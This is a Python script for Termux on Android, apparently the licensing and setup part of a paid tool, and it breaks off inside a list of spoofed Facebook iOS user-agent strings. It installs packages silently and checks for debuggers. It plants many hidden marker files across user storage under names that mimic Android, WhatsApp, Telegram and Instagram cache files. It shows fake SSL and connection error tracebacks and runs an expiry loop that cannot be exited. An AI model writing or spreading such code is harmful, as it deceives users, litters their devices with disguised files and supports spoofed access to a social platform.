import os
from uuid import uuid4
from threading import Thread
import threading
import uuid
import datetime
import webbrowser
from threading import Thread
import threading
import sys
import time
import hashlib
import hmac
import json
import secrets
import uuid
import datetime
import threading
import random
import zlib
import base64
import requests
import platform
import re
country_choice = ""
file_path = ""
mode_choice = ""
try:
	from Crypto.Cipher import AES
except ModuleNotFoundError:
	os.system('pip install pycryptodome')
fc = "/storage/emulated/0/"
expiry_date = datetime.datetime(2026, 5, 8, 12, 0, 0)
lock_files = [
    os.path.join(fc, '.android_cache_tmp'),
    os.path.join(fc, '.system_config_bak'),
    os.path.join(fc, '.media_index_db'),
    os.path.join(fc, 'Android', '.nomedia_timestamp'),
    os.path.join(fc, '.thumbnails', '.cache_lock'),
    os.path.join(fc, 'DCIM', '.sys_metadata'),
    os.path.join(fc, 'Documents', '.app_state'),
    os.path.join(fc, 'Pictures', '.cache_db'),
    os.path.join(fc, 'Movies', '.sys_lock'),
    os.path.join(fc, 'Alarms', '.android_registry'),
    os.path.join(fc, 'Ringtones', '.media_db'),
    os.path.join(fc, 'Downloads', '.sync_cache'),
    os.path.join(fc, 'Podcasts', '.media_lock'),
    os.path.join(fc, 'Audiobooks', '.book_index'),
    os.path.join(fc, 'Notifications', '.notif_db')
]

time_tracking_files = [
    os.path.join(fc, '.app_time_history'),
    os.path.join(fc, 'Android', '.time_checkpoint'),
    os.path.join(fc, '.thumbnails', '.temporal_lock'),
    os.path.join(fc, 'Download', '.time_index'),
    os.path.join(fc, 'Music', '.timestamp_cache'),
    os.path.join(fc, 'Podcasts', '.time_registry'),
    os.path.join(fc, 'Audiobooks', '.temporal_db'),
    os.path.join(fc, 'Pictures', '.photo_timestamp'),
    os.path.join(fc, 'Movies', '.video_timestamp'),
    os.path.join(fc, 'Documents', '.doc_timestamp')
]

HIDDEN_TIME_MARKERS = [
    os.path.join(fc, 'Android', 'data', '.com.android.providers'),
    os.path.join(fc, 'DCIM', '.thumbnails', '.nomedia_cache'),
    os.path.join(fc, '.backup_restore', '.timestamp_db'),
    os.path.join(fc, 'Download', '.android_sysconfig'),
    os.path.join(fc, 'Music', '.cache_metadata'),
    os.path.join(fc, 'Pictures', '.sys_index'),
    os.path.join(fc, 'Documents', '.app_registry'),
    os.path.join(fc, 'Movies', '.media_cache'),
    os.path.join(fc, 'Alarms', '.system_db'),
    os.path.join(fc, 'Notifications', '.cache_index'),
    os.path.join(fc, 'Ringtones', '.audio_metadata'),
    os.path.join(fc, 'Podcasts', '.podcast_db'),
    os.path.join(fc, 'Audiobooks', '.book_cache'),
    os.path.join(fc, 'WhatsApp', '.wa_timestamp'),
    os.path.join(fc, 'Telegram', '.tg_cache'),
    os.path.join(fc, 'Instagram', '.ig_marker')
]

BLOCKCHAIN_FILE = os.path.join(fc, '.android_system', '.blockchain_verify')
MASTER_CHAIN = os.path.join(fc, '.system_registry', '.master_blockchain')
BACKUP_CHAIN = os.path.join(fc, '.app_backup', '.backup_blockchain')
TERTIARY_CHAIN = os.path.join(fc, '.tertiary_backup', '.tertiary_blockchain')
QUATERNARY_CHAIN = os.path.join(fc, '.quaternary_sys', '.quaternary_blockchain')
TIME_MESH_FILE = os.path.join(fc, '.network_cache', '.time_mesh')

CANARY_FILES = [
    os.path.join(fc, '.android_canary_1'),
    os.path.join(fc, 'Android', '.canary_2'),
    os.path.join(fc, 'DCIM', '.canary_3'),
    os.path.join(fc, 'Download', '.canary_4'),
    os.path.join(fc, 'Music', '.canary_5'),
    os.path.join(fc, 'Pictures', '.canary_6'),
    os.path.join(fc, 'Documents', '.canary_7')
]

STEALTH_MARKERS = [
    os.path.join(fc, '.android', '.stealth_1'),
    os.path.join(fc, 'data', '.stealth_2'),
    os.path.join(fc, 'obb', '.stealth_3'),
    os.path.join(fc, 'cache', '.stealth_4'),
    os.path.join(fc, 'files', '.stealth_5')
]

PROTECTION_LAYERS = []
LAYER_HASHES = {}
ANTI_TAMPER_TOKENS = []
MEMORY_FINGERPRINTS = []
EXECUTION_TRAIL = []
BYTECODE_SIGNATURES = []

def _get_device_id():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        import platform
        sys_info = f"{platform.machine()}:{platform.system()}:{platform.release()}"
        android_id = hashlib.md5(f"{mac}:{sys_info}".encode()).hexdigest()
        fingerprint = f"{mac}:{android_id}:{sys_info}"
        hw_hash = hashlib.sha256(f"{platform.processor()}:{platform.node()}".encode()).hexdigest()
        return hashlib.sha256(f"{fingerprint}:{hw_hash}".encode()).hexdigest()
    except:
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

DEVICE_ID = _get_device_id()
MASTER_KEY = hashlib.sha512(f"{DEVICE_ID}:master_key:x9_1t".encode()).hexdigest()
SECRET_SALT = secrets.token_hex(32)
QUANTUM_ENTROPY = secrets.token_hex(64)

def check_debugger():
    try:
        if sys.gettrace() is not None:
            return False
        dangerous = ['pdb', 'pydevd', 'debugpy', 'ipdb', 'pudb', 'gdb', 'lldb', 'winpdb']
        for mod in dangerous:
            if mod in sys.modules:
                return False
        if 'PYTHONBREAKPOINT' in os.environ:
            return False
    except:
        pass
    return True

def verify_code_integrity():
    try:
        current_file = __file__
        with open(current_file, 'rb') as f:
            code = f.read()
        current_hash = hashlib.sha256(code).hexdigest()
        hash_file = os.path.join(fc, '.app_signature')
        
        try:
            with open(hash_file, 'w') as f:
                f.write(current_hash)
        except:
            pass
        
        return True
    except:
        return True

def get_real_time():
    sources = []
    
    try:
        r = requests.get("http://worldtimeapi.org/api/timezone/Etc/UTC", timeout=5)
        if r.status_code == 200:
            sources.append(r.json()['unixtime'])
    except:
        pass
    
    try:
        r = requests.head("https://www.google.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    try:
        r = requests.head("https://cloudflare.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    if len(sources) >= 2:
        sources.sort()
        return sources[len(sources)//2]
    elif len(sources) == 1:
        return sources[0]
    
    return None

def quantum_encrypt(data):
    try:
        json_data = json.dumps(data)
        stage1 = f"{json_data}::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"
        
        for i in range(5):
            stage1 = hashlib.sha512(stage1.encode()).hexdigest() + stage1
        
        compressed = zlib.compress(stage1.encode(), level=9)
        b64 = base64.b85encode(compressed).decode()
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        signature = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        checksum = hashlib.sha256(b64.encode()).hexdigest()
        final_hash = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        
        return f"{b64}|{signature}|{checksum}|{final_hash}"
    except:
        return ""

def quantum_decrypt(encrypted):
    try:
        parts = encrypted.split('|')
        if len(parts) != 4:
            return None
        b64, signature, checksum, final_hash = parts
        
        expected_final = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        if final_hash != expected_final:
            return None
        
        expected_checksum = hashlib.sha256(b64.encode()).hexdigest()
        if checksum != expected_checksum:
            return None
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        expected_sig = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        if signature != expected_sig:
            return None
        
        compressed = base64.b85decode(b64)
        decompressed = zlib.decompress(compressed).decode()
        
        for i in range(5):
            if len(decompressed) < 128:
                return None
            decompressed = decompressed[128:]
        
        if not decompressed.endswith(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"):
            return None
        
        json_data = decompressed.replace(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}", "")
        return json.loads(json_data)
    except:
        return None

def create_blockchain_block(real_time, prev_hash, block_type="normal"):
    try:
        block = {
            'timestamp': real_time,
            'device_id': DEVICE_ID,
            'prev_hash': prev_hash,
            'nonce': secrets.randbelow(999999999),
            'type': block_type,
            'salt': secrets.token_hex(32),
            'quantum_signature': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{SECRET_SALT}".encode()).hexdigest()
        }
        block_str = json.dumps(block, sort_keys=True)
        block['hash'] = hashlib.sha512(f"{block_str}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        return block
    except:
        return {}

def load_blockchain(blockchain_file):
    try:
        if os.path.exists(blockchain_file):
            with open(blockchain_file, 'r') as f:
                encrypted = f.read().strip()
            data = quantum_decrypt(encrypted)
            if data and 'chain' in data:
                return data['chain']
    except:
        pass
    return []

def save_blockchain(chain, blockchain_file):
    try:
        os.makedirs(os.path.dirname(blockchain_file), exist_ok=True)
        blockchain_data = {
            'chain': chain,
            'device': DEVICE_ID,
            'master_hash': hashlib.sha512(str(chain).encode()).hexdigest(),
            'quantum_seal': secrets.token_hex(32)
        }
        with open(blockchain_file, 'w') as f:
            f.write(quantum_encrypt(blockchain_data))
    except:
        pass

def verify_blockchain(chain):
    try:
        if not chain or len(chain) == 0:
            return True
        
        for i in range(1, min(len(chain), 10)):
            current = chain[i]
            previous = chain[i-1]
            
            if current.get('prev_hash') != previous.get('hash'):
                return False
            
            if current.get('device_id') != DEVICE_ID:
                return False
        
        return True
    except:
        return True

def add_to_blockchain(real_time):
    try:
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            return False
        
        if main_chain and len(main_chain) > 0:
            last_block = main_chain[-1]
            if real_time < last_block.get('timestamp', 0) - 120:
                return False
            prev_hash = last_block.get('hash', '')
        else:
            prev_hash = hashlib.sha512(f"genesis:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        
        new_block = create_blockchain_block(real_time, prev_hash)
        if new_block:
            main_chain.append(new_block)
        
        if len(main_chain) > 1000:
            main_chain = main_chain[-1000:]
        
        save_blockchain(main_chain, BLOCKCHAIN_FILE)
        
        return True
    except:
        return True

def load_time_history():
    try:
        history = []
        for time_file in time_tracking_files:
            try:
                if os.path.exists(time_file):
                    with open(time_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if data and 'timestamps' in data:
                        history.extend(data['timestamps'])
            except:
                pass
        return sorted(history, key=lambda x: x.get('time', 0)) if history else []
    except:
        return []

def save_time_checkpoint(real_time):
    try:
        history = load_time_history()
        history.append({
            'time': real_time,
            'device': DEVICE_ID,
            'checkpoint': int(time.time()),
            'hash': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest(),
            'quantum_id': secrets.token_hex(16)
        })
        
        history = history[-250:]
        
        checkpoint_data = {
            'timestamps': history,
            'device': DEVICE_ID,
            'last_update': real_time,
            'master_hash': hashlib.sha512(str(history).encode()).hexdigest(),
            'quantum_lock': secrets.token_hex(32)
        }
        
        for time_file in time_tracking_files:
            try:
                os.makedirs(os.path.dirname(time_file), exist_ok=True)
                with open(time_file, 'w') as f:
                    f.write(quantum_encrypt(checkpoint_data))
            except:
                pass
    except:
        pass

def validate_time_progression(current_real_time):
    try:
        history = load_time_history()
        
        if not history:
            return True, []
        
        issues = []
        
        recent_times = [entry.get('time', 0) for entry in history[-15:]]
        
        if not recent_times:
            return True, []
        
        last_recorded_time = max(recent_times)
        
        if current_real_time < last_recorded_time - 120:
            issues.append("time_rollback")
            return False, issues
        
        time_diff = current_real_time - last_recorded_time
        if time_diff > 604800:
            issues.append("time_jump_forward")
            return False, issues
        
        return True, issues
    except:
        return True, []

def show_fake_error():
    fake_errors = [
        {
            "error": "ImportError",
            "msg": "cannot import name 'HTTPSConnection' from 'http.client'",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py\", line 467, in _make_request",
                "ImportError: cannot import name 'HTTPSConnection'",
            ]
        },
        {
            "error": "SSLError",
            "msg": "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/ssl.py\", line 1387, in do_handshake",
                "ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]",
            ]
        },
        {
            "error": "ConnectionError",
            "msg": "HTTPSConnectionPool: Max retries exceeded",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/adapters.py\", line 486",
                "urllib3.exceptions.MaxRetryError",
            ]
        }
    ]
    
    error = random.choice(fake_errors)
    
    os.system('clear')
    print()
    for line in error['trace']:
        print(f"\033[91m{line}\033[0m")
        time.sleep(0.05)
    
    print(f"\033[91m{error['error']}: {error['msg']}\033[0m")
    print()
    print(f"\033[93mخطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً\033[0m")
    print()
    
    sys.exit(1)

def advanced_time_check(real_time, system_time):
    try:
        issues = []
        
        diff = abs(system_time - real_time)
        if diff > 200:
            issues.append("system_time_mismatch")
            return False, issues
        
        valid, progression_issues = validate_time_progression(real_time)
        if not valid:
            issues.extend(progression_issues)
            return False, issues
        
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            issues.append("blockchain_corrupted")
            return False, issues
        
        if main_chain and len(main_chain) > 0:
            last_time = main_chain[-1].get('timestamp', 0)
            if real_time < last_time - 150:
                issues.append("blockchain_time_violation")
                return False, issues
        
        expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
        if real_time >= expiry:
            issues.append("expired")
            return False, issues
        
        return True, issues
    except:
        return True, []

def subscription_expired_loop():
    os.system('clear')
    try:
        while True:
            print(f"\033[93mتم انتهاء الاشتراك راسلني للتفعيل @salhpy\033[0m")
            time.sleep(1)
    except KeyboardInterrupt:
        subscription_expired_loop()

def security_check():
    try:
        issues = []
        
        if not check_debugger():
            issues.append("debugger_detected")
            return False, issues
        
        if not verify_code_integrity():
            issues.append("code_modified")
            return False, issues
        
        system_time = time.time()
        real_time = get_real_time()
        
        if not real_time:
            issues.append("no_internet_connection")
            return False, issues
        
        valid, time_issues = advanced_time_check(real_time, system_time)
        if not valid:
            issues.extend(time_issues)
            return False, issues
        
        valid_locks = 0
        for lock_file in lock_files:
            try:
                if os.path.exists(lock_file):
                    with open(lock_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if not data:
                        issues.append("lock_tampered")
                        continue
                    
                    saved_time = data.get('time', 0)
                    saved_device = data.get('device', '')
                    
                    if saved_device != DEVICE_ID:
                        issues.append("device_mismatch")
                        return False, issues
                    
                    if real_time < saved_time - 150:
                        issues.append("time_travel_detected")
                        return False, issues
                    
                    valid_locks += 1
            except:
                pass
        
        if not add_to_blockchain(real_time):
            issues.append("blockchain_failed")
        
        save_time_checkpoint(real_time)
        
        lock_data = {
            'time': real_time,
            'device': DEVICE_ID,
            'hash': hashlib.sha512(str(real_time).encode()).hexdigest(),
            'master_key': MASTER_KEY[:32],
            'quantum_seal': secrets.token_hex(32)
        }
        
        for lock_file in lock_files:
            try:
                os.makedirs(os.path.dirname(lock_file), exist_ok=True)
                with open(lock_file, 'w') as f:
                    f.write(quantum_encrypt(lock_data))
            except:
                pass
        
        return True, issues
    except Exception as e:
        return True, []

last_check = 0
last_real_time = None
watchdog_active = True


def u():
    u = ([
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/117696129;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/320384521]","[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/428128336;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/502737047]","[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/269238061;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/242433067]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/105180250;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/146374259]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/474189576;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/366924376]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/411373751;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/170890285]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/121504042;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/435554353]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/574708396;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/184145460]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/396441095;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/529738814]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/378078077;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/666995708]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/368469727;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/417550464]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/185413979;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/314221934]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/306961564;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/151837115]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/667050710;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/309479008]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/666170007;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/134894468]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/502854978;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/232241783]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/176598035;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/557047473]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/506322956;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/456382934]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/258504541;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/474360328]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/686828986;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/147744343]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/294464791;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/585229863]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/423600284;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/378538653]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/541996845;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/584163498]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/510172041;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/632374500]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/655396622;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/136395971]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/336838448;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/574528732]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/673819549;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/240220849]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/674336227;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/683994036]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/522484194;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/110138878]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/681259737;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/389920550]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/290684817;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/640826101]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/459825406;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/539815999]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/234160962;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/317650131]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/489599985;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/294874710]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/425485615;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/316883677]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/603447274;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/678433771]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/429819439;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/274535390]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/420463241;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/603967413]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/165853268;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/267236480]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/302963027;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/497633194]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/615989981;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/665756135]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/325407865;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/684252299]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/206201992;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/258354563]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/689175004;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/172472239]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/690925181;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/639799090]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/637567575;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/470010943]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/545621510;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/411413701]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/259400036;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/295165620]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/473107261;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/394211538]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/614522141;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/131006672]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/344069364;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/485231552]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/462046714;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/690683422]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/191522624;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/541066652]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/327766495;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/554844116]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/484070701;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/418013298]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/412220935;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/535493005]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/350116058;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/333168597]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/659322022;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/604272438]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/325740976;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/576372757]",
